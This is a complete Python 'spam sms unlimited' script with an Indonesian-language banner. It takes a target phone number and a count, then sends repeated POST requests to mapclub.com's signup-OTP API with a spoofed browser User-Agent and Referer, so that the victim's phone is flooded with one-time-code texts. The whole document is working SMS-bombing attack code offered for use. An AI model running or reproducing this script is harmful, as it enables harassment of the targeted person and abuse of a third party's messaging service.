import json,requests,time,os

     
os.system('clear')
os.system('figlet spam_sms')
banner="""
spam sms unlimited
====================
creator : harlan
====================
fb      : harlan jhy
====================
"""
print(banner)

no = int(input("masukan nomor target : "))
jum = int(input("masukan jumlah sms : "))
print("sedang mengirim pesan...")

head = {
"User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
"Referer": "https://www.mapclub.com/en/user/signup",
"Host": "cmsapi.mapclub.com",
}

data = {
"phone" : no
}

for x in range(int(jum)):
      leosureo = requests.post("https://cmsapi.mapclub.com/api/signup-otp", headers=head, json=data)
      print("[!] pesan berhasil dikirim")

if 'error' in leosureo:
      print("[!] gagal mengirim pesan")
